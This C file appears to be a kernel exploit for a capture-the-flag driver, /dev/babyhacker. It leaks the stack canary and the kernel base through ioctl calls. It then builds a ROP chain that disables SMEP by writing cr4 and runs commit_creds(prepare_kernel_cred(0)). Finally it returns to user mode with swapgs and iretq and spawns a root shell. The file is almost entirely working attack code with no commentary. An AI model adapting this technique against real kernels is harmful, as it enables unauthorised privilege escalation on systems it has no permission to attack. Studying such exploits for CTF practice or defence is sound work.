#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <sys/wait.h>
#include <sys/stat.h>


size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    puts("[+] status has been saved.");
}


size_t raw_vmlinux_base = 0xffffffff81000000;
size_t prepare_kernel_cred, commit_creds;
void get_root()
{
    char* (*pkc)(int) = prepare_kernel_cred;
    void (*cc)(char*) = commit_creds;
    (*cc)((*pkc)(0));
}


void spawn_shell()
{
    if (!getgid())
    {
        puts("[+] get root shell!");
        system("/bin/sh");
    }
    else
    {
        puts("[-] get root Failed!");
    }
    exit(0);
}


int main()
{
    save_status();
    int fd = open("/dev/babyhacker", 0);
    int size = 0xffff0200;
    char buf[0x200] = {0};
    ioctl(fd, 0x30000, size);
    ioctl(fd, 0x30002, buf);
    size_t canary = ((size_t *)buf)[40], ret_addr = ((size_t *)buf)[42];
    size_t vmlinux_base = ret_addr - 0x219218;
    size_t offset = vmlinux_base - raw_vmlinux_base;
    prepare_kernel_cred = vmlinux_base + 0xa1820;
    commit_creds = vmlinux_base + 0xa1430;
    printf("[+] canary: %llx\n", canary);
    printf("[+] ret_addr: %llx\n", ret_addr);
    printf("[+] vmlinux_base: %llx\n", vmlinux_base);
    printf("[+] offset: %llx\n", offset);

    size_t rop_chain[0x40] = {0};
    int i = 42;
    rop_chain[40] = canary;
    rop_chain[i++] = offset + 0xffffffff8109054d;           // pop rdi; ret;
    rop_chain[i++] = 0x6f0;
    rop_chain[i++] = offset + 0xffffffff81004d70;           // mov cr4, rdi; pop rbp; ret;
    rop_chain[i++] = 0;
    rop_chain[i++] = (size_t)get_root;
    rop_chain[i++] = offset + 0xffffffff810636b4;           // swapgs; pop rbp; ret;
    rop_chain[i++] = 0;
    rop_chain[i++] = offset + 0xffffffff8157c6aa;           // iretq; mov edx, 1; mov esi, r12d; mov rdi, rbx; call qword ptr [rbx + 0x40];
    rop_chain[i++] = (size_t)spawn_shell;                   // rip
    rop_chain[i++] = user_cs;
    rop_chain[i++] = user_rflags;
    rop_chain[i++] = user_sp;
    rop_chain[i++] = user_ss;
    // getchar();
    ioctl(fd, 0x30001, rop_chain);
    return 0;
}
